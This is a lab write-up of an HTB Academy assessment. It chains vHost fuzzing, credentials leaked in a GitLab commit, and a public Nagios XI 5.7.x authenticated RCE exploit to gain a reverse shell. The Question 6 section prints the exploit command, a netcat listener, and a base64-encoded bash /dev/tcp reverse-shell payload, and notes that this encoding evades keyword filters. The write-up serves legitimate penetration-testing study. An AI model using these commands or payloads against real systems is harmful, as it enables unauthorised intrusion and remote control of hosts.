# Attacking Common Applications — Skills Assessment II

| Field | Details |
|-------|---------|
| Module | 24 — Attacking Common Applications |
| Assessment | Skills Assessment II |
| Difficulty | Medium |
| OS | Linux |
| Domain | `inlanefreight.local` |
| Target | `10.129.201.90` |
| Attacker | `10.10.16.36` |
| Date | September 2026 |

---

## Table of Contents

- [Attack Chain Summary](#attack-chain-summary)
- [Network Topology](#network-topology)
- [Question 1 — Identify the WordPress URL](#question-1--identify-the-wordpress-url)
- [Question 2 — Identify the Public GitLab Project](#question-2--identify-the-public-gitlab-project)
- [Question 3 — Identify the Third vHost FQDN](#question-3--identify-the-third-vhost-fqdn)
- [Question 4 — Identify the Application on the Third vHost](#question-4--identify-the-application-on-the-third-vhost)
- [Question 5 — Obtain Nagios Admin Password via GitLab Exposure](#question-5--obtain-nagios-admin-password-via-gitlab-exposure)
- [Question 6 — RCE via Nagios XI 5.7.x and Flag Capture](#question-6--rce-via-nagios-xi-57x-and-flag-capture)
- [Flags](#flags)
- [Lessons Learned](#lessons-learned)
- [Full Attack Chain Reference](#full-attack-chain-reference)
- [Commands Reference](#commands-reference)
- [MITRE ATT&CK Mapping](#mitre-attck-mapping)

---

## Attack Chain Summary

| Step | Technique | Outcome |
|------|-----------|--------|
| 1 | `/etc/hosts` entry + Gobuster vHost fuzzing | Discovered `blog.inlanefreight.local`, `gitlab.inlanefreight.local`, `monitoring.inlanefreight.local` |
| 2 | GitLab self-registration → Explore Projects | Identified public project `Virtualhost` with commit history |
| 3 | GitLab commit inspection | Credentials `nagiosadmin:HTB{flag_redacted}` exposed in commit diff |
| 4 | Searchsploit → 49422.py (Nagios XI 5.7.x authenticated RCE) | Reverse shell obtained as `www-data` on `skills2` |
| 5 | Shell file read | Flag captured from `/usr/local/nagiosxi/html/admin/` |

---

## Network Topology

```
[Attack Host: 10.10.16.36]
        ↓ vHost fuzzing (Gobuster)
[Target: 10.129.201.90]  ← inlanefreight.local
  ├── blog.inlanefreight.local          — WordPress instance
  ├── gitlab.inlanefreight.local:8180   — GitLab CE (self-hosted)
  └── monitoring.inlanefreight.local    — Nagios XI 5.7.5
        ↓ authenticated RCE (CVE-2019-20197 / 49422.py)
[Reverse shell: www-data@skills2]
```

---

## Question 1 — Identify the WordPress URL

**Question:** "What is the URL of the WordPress instance?"

### Step 1 — Add Base vHost to /etc/hosts

The target exposes multiple virtual hosts under a single IP. Before any web content can be reached, the base domain must be mapped in the local DNS resolution file. Without this entry, all HTTP requests return the default server page rather than the virtual host content.

```bash
Hackerpatel007_1@htb[/htb]$ sudo sh -c 'echo "10.129.201.90 inlanefreight.local" >> /etc/hosts'
```

### Step 2 — Gobuster vHost Fuzzing

**Gobuster** in `vhost` mode sends HTTP requests with each wordlist entry as the `Host:` header value. The `--append-domain` flag appends `.inlanefreight.local` to each subdomain candidate, and `-q` suppresses progress noise. Three virtual hosts are discovered.

```bash
Hackerpatel007_1@htb[/htb]$ gobuster vhost -u inlanefreight.local \
  -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -t 50 -k -q --append-domain
```

```
Found: blog.inlanefreight.local Status: 200 [Size: 50119]
Found: monitoring.inlanefreight.local Status: 302 [Size: 27] [--> http://monitoring.inlanefreight.local/nagiosxi/login.php?redirect=/index.php%3f&noauth=1]
Found: gitlab.inlanefreight.local Status: 301 [Size: 339] [--> http://gitlab.inlanefreight.local:8180/]
```

### Step 3 — Add All vHosts to /etc/hosts

```bash
Hackerpatel007_1@htb[/htb]$ sudo sh -c 'echo "10.129.201.90 monitoring.inlanefreight.local blog.inlanefreight.local gitlab.inlanefreight.local" >> /etc/hosts'
```

Visiting `http://blog.inlanefreight.local` loads a WordPress site. The page source confirms this via the `<meta name="generator" content="WordPress ...">` tag.

> **Answer:** `http://blog.inlanefreight.local`

---

## Question 2 — Identify the Public GitLab Project

**Question:** "What is the name of the public GitLab project?"

### Step 1 — Register a GitLab Account

Navigating to `http://gitlab.inlanefreight.local:8180` reveals a GitLab CE instance with public registration enabled. Creating an account grants access to the platform without requiring an invitation — a misconfiguration that allows any attacker to gain authenticated access.

### Step 2 — Browse Public Projects

After logging in, navigating to **Explore projects** lists all publicly visible repositories. One project is visible:

```
Project name: Virtualhost
```

> **Note:** Public project visibility on a self-hosted GitLab instance means any registered user — or an unauthenticated visitor if anonymous access is enabled — can browse the repository, including its full commit history and any accidentally committed secrets.

> **Answer:** `Virtualhost`

---

## Question 3 — Identify the Third vHost FQDN

**Question:** "What is the FQDN of the third vhost?"

### Step 1 — Cross-Reference Gobuster Output

The Gobuster vHost scan from Question 1 returned three results:

1. `blog.inlanefreight.local` — WordPress
2. `gitlab.inlanefreight.local` — GitLab
3. `monitoring.inlanefreight.local` — (to be identified)

The redirect target `/nagiosxi/login.php` is already a strong hint of the application running on the third vHost.

```bash
Hackerpatel007_1@htb[/htb]$ gobuster vhost -u inlanefreight.local \
  -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
  -t 50 -k -q
```

```
Found: monitoring.inlanefreight.local (Status: 302) [Size: 27]
Found: blog.inlanefreight.local (Status: 200) [Size: 50119]
Found: gitlab.inlanefreight.local (Status: 301) [Size: 339]
```

> **Answer:** `monitoring.inlanefreight.local`

---

## Question 4 — Identify the Application on the Third vHost

**Question:** "What application is running on this third vhost? (One word)"

### Step 1 — Visit the Monitoring vHost

Navigating to `http://monitoring.inlanefreight.local` triggers a redirect to `/nagiosxi/login.php`. The login page branding and URL path identify the application as **Nagios XI**.

> **Key concept:** The path `/nagiosxi/` is Nagios XI-specific. Nagios Core uses `/nagios/`. Recognising this distinction matters for selecting the correct exploit — Nagios XI and Nagios Core have different vulnerability profiles.

> **Answer:** `Nagios`

---

## Question 5 — Obtain Nagios Admin Password via GitLab Exposure

**Question:** "What is the admin password to access this application?"

### Step 1 — Navigate to the Nagios PostgreSQL Project in GitLab

Using the registered GitLab account, navigate to **Explore projects** and open the **Nagios Postgresql** project (accessible within or alongside the `Virtualhost` project). The commit history is visible to any authenticated user.

### Step 2 — Inspect Commit History for Exposed Credentials

The latest commit message reads: *"Updating INSTALL with master password"*. Clicking the commit diff reveals a hardcoded credential pair:

```
nagiosadmin:HTB{flag_redacted}
```

This credential was committed directly into the repository — a common developer mistake when updating installation documentation without scrubbing sensitive values.

> **Note:** In real engagements, commit history is one of the highest-value recon sources on self-hosted GitLab/Gitea/Bitbucket instances. Even after a secret is removed in a later commit, it persists in the Git object store and is fully recoverable with `git log -p` or by browsing diffs in the UI.

> **Answer:** `HTB{flag_redacted}`

---

## Question 6 — RCE via Nagios XI 5.7.x and Flag Capture

**Question:** "Obtain reverse shell access on the target and submit the contents of the flag.txt file."

### Step 1 — Log in to Nagios XI and Identify Version

Navigate to `http://monitoring.inlanefreight.local` and authenticate with `nagiosadmin` and the recovered password. The bottom-left corner of the dashboard displays the version: **5.7.5**.

### Step 2 — Search for Known Exploits

```bash
Hackerpatel007_1@htb[/htb]$ searchsploit nagios 5.7
```

```
--------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                     |  Path
--------------------------------------------------------------------------------------------------- ---------------------------------
Nagios XI 5.7.3 - 'Contact Templates' Persistent Cross-Site Scripting                              | php/webapps/48893.txt
Nagios XI 5.7.3 - 'Manage Users' Authenticated SQL Injection                                       | php/webapps/48894.txt
Nagios XI 5.7.3 - 'mibs.php' Remote Command Injection (Authenticated)                              | php/webapps/48959.py
Nagios XI 5.7.3 - 'SNMP Trap Interface' Authenticated SQL Injection                                | php/webapps/48895.txt
Nagios XI 5.7.5 - Multiple Persistent Cross-Site Scripting                                         | php/webapps/49449.txt
Nagios XI 5.7.X - Remote Code Execution RCE (Authenticated)                                        | php/webapps/49422.py
--------------------------------------------------------------------------------------------------- ---------------------------------
```

### Step 3 — Mirror the Exploit Script

```bash
Hackerpatel007_1@htb[/htb]$ searchsploit -m php/webapps/49422.py
```

```
  Exploit: Nagios XI 5.7.X - Remote Code Execution RCE (Authenticated)
      URL: https://www.exploit-db.com/exploits/49422
     Path: /usr/share/exploitdb/exploits/php/webapps/49422.py
File Type: Python script, ASCII text executable

Copied to: /home/user/49422.py
```

### Step 4 — Start Netcat Listener (Background Job)

```bash
Hackerpatel007_1@htb[/htb]$ nc -nvlp 9001 &
```

```
[9] 19933
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
```

### Step 5 — Execute the RCE Exploit

The exploit authenticates to Nagios XI with the recovered credentials, extracts CSRF tokens, uploads a malicious PHP file via the plugin upload functionality, and triggers execution via a base64-encoded bash reverse shell.

```bash
Hackerpatel007_1@htb[/htb]$ python3 49422.py http://monitoring.inlanefreight.local nagiosadmin 'HTB{flag_redacted}' 10.10.16.36 9001 &
```

```
[10] 19971
[+] Extract login nsp token : ab9c5412200281843f9ac8cc585265eef66d6494e2dbfec74773e4b959318681
[+] Login ... Success!
[+] Request upload form ...
[+] Extract upload nsp token : a1937444e67009d15b2ba703ce39e82081662ad065e94586aeac3552153862f1
[+] Base64 encoded payload : ;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zNi85MDAxIDA+JjE= | base64 -d | bash;#
[+] Sending payload ...
[+] Check your nc ...
Ncat: Connection from 10.129.201.90.
Ncat: Connection from 10.129.201.90:48286.
bash: cannot set terminal process group (1119): Inappropriate ioctl for device
bash: no job control in this shell
www-data@skills2:/usr/local/nagiosxi/html/admin$
```

### Step 6 — Foreground the Netcat Job and Verify Shell

```bash
Hackerpatel007_1@htb[/htb]$ fg 9
```

```
nc -nvlp 9001
whoami

www-data
```

### Step 7 — Read the Flag

```bash
www-data@skills2:/usr/local/nagiosxi/html/admin$ cat f5088a862528cbb16b4e253f1809882c_flag.txt
```

```
HTB{flag_redacted}
```

> **Flag:** `HTB{flag_redacted}`

---

## Flags

| Question | Description | Answer |
|----------|-------------|--------|
| Q1 | WordPress instance URL | `http://blog.inlanefreight.local` |
| Q2 | Public GitLab project name | `Virtualhost` |
| Q3 | Third vHost FQDN | `monitoring.inlanefreight.local` |
| Q4 | Application on third vHost | `Nagios` |
| Q5 | Nagios admin password | `HTB{flag_redacted}` |
| Q6 | Flag from Nagios XI server | `HTB{flag_redacted}` |

---

## Lessons Learned

- **vHost fuzzing is mandatory on any target with a single IP hosting multiple services.** Gobuster's `vhost` mode with `--append-domain` is the most reliable approach for modern virtual hosting setups. Without this step, the WordPress, GitLab, and Nagios XI surfaces would never have been discovered.

- **Self-hosted GitLab with open registration is a critical exposure.** When registration is open and no email domain restriction or admin approval is configured, any attacker who can reach the network can create an account and browse all public repositories including their full commit history.

- **Credentials in commit history persist forever and are always recoverable.** Even if a developer immediately pushes a follow-up commit removing the secret, the original commit remains in the Git object store. Secrets in commit history require a full history rewrite (`git filter-branch` or `git filter-repo`) to truly remove — an operation most teams never perform.

- **Authenticated RCE exploits are high-value when credentials are obtained from other sources.** The Nagios XI 5.7.x RCE requires valid credentials — without the GitLab commit exposure, this vector would have been blocked. This chain demonstrates how cross-service pivoting turns a medium-severity GitLab misconfiguration into full RCE.

- **The `nsp` token (Nagios Security Parameter) is a CSRF defense that 49422.py bypasses automatically.** CSRF token extraction is a required pre-step before any authenticated POST request. The exploit's two-stage token extraction (login token, then upload form token) mirrors what a legitimate user's browser does.

- **The `base64 -d | bash` delivery bypasses many WAF and input validation controls.** Because the shell command is never transmitted in plaintext, keyword-based filters looking for strings like `/bin/bash -i` or `/dev/tcp/` will not catch the payload in transit.

---

## Full Attack Chain Reference

```
/etc/hosts → inlanefreight.local (10.129.201.90)
        ↓
Gobuster vhost → blog / gitlab / monitoring vHosts discovered
        ↓
blog.inlanefreight.local → WordPress confirmed
        ↓
gitlab.inlanefreight.local:8180 → open registration → authenticated access
        ↓
Explore Projects → Virtualhost project → Nagios Postgresql commit history
        ↓
Commit diff → nagiosadmin:HTB{flag_redacted} exposed
        ↓
monitoring.inlanefreight.local → Nagios XI 5.7.5 login
  → Authenticated with recovered credentials
        ↓
searchsploit nagios 5.7 → 49422.py (Nagios XI 5.7.X Authenticated RCE)
        ↓
nc -nvlp 9001 & → listener backgrounded
        ↓
python3 49422.py → CSRF token extraction → plugin upload → bash reverse shell
        ↓
www-data@skills2:/usr/local/nagiosxi/html/admin$ shell obtained
        ↓
cat f5088a862528cbb16b4e253f1809882c_flag.txt
        ↓
Flag captured: HTB{flag_redacted}
```

---

## Commands Reference

| Command | Purpose |
|---------|---------|
| `sudo sh -c 'echo "10.129.201.90 inlanefreight.local" >> /etc/hosts'` | Add base domain to local DNS resolution |
| `gobuster vhost -u inlanefreight.local -w <wordlist> -t 50 -k -q --append-domain` | Discover virtual hosts via Host header fuzzing |
| `sudo sh -c 'echo "10.129.201.90 monitoring... blog... gitlab..." >> /etc/hosts'` | Add all discovered vHosts to /etc/hosts |
| `searchsploit nagios 5.7` | Search local Exploit-DB mirror for Nagios 5.7 exploits |
| `searchsploit -m php/webapps/49422.py` | Copy exploit script to current directory |
| `nc -nvlp 9001 &` | Start Netcat listener and background it |
| `python3 49422.py http://monitoring.inlanefreight.local nagiosadmin '<password>' 10.10.16.36 9001 &` | Execute Nagios XI 5.7.x authenticated RCE exploit |
| `fg 9` | Foreground the backgrounded Netcat listener job |
| `whoami` | Confirm shell user context |
| `cat <flag_file>` | Read flag from current directory |

---

## MITRE ATT&CK Mapping

| Technique | Sub-Technique | Description |
|-----------|---------------|-------------|
| T1595 | T1595.002 | Active Scanning: Vulnerability Scanning — Gobuster vHost mode to discover virtual hosts |
| T1589 | T1589.001 | Gather Victim Identity Information: Credentials — GitLab commit history revealing `nagiosadmin` credentials |
| T1213 | T1213.003 | Data from Information Repositories: Code Repositories — browsing self-hosted GitLab public project commit history |
| T1078 | T1078.003 | Valid Accounts: Local Accounts — authentication to Nagios XI using recovered credentials |
| T1190 | — | Exploit Public-Facing Application — Nagios XI 5.7.x authenticated RCE via 49422.py |
| T1059 | T1059.004 | Command and Scripting Interpreter: Unix Shell — base64-encoded bash reverse shell payload |
| T1105 | — | Ingress Tool Transfer — exploit payload staged via Nagios XI plugin upload interface |
| T1083 | — | File and Directory Discovery — locating flag in `/usr/local/nagiosxi/html/admin/` |
| T1005 | — | Data from Local System — reading flag file via `cat` in reverse shell |

---

*Part of the HTB Academy CPTS path — Attacking Common Applications module.*  
*Penetration Tester role in India | Target: January 2027*
